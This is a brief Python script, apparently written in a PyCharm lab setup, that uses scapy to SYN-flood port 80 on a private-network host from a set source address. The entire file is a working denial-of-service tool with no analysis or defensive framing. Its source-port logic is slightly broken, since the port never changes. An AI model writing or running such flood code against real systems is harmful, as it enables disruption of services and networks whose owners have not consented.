# This is a sample Python script.
from scapy.layers.inet import IP, TCP
from scapy.sendrecv import send


def syn_flood(src,dst):
    iterations = 100
    batch = 10000
    sport = 1024
    for i in range(iterations):
        for b in range (batch):
            sport = sport if sport <= 65535 else 1024
            # for sport in range(1024,65535):
            IPL = IP(src=src,dst=dst)
            TCPL = TCP(sport=sport,dport = 80)
            pkt = IPL/TCPL
            send(pkt)


if __name__ == '__main__':
    src = "10.0.2.15"
    dst = "10.0.2.5"
    syn_flood(src,dst)

# See PyCharm help at https://www.jetbrains.com/help/pycharm/
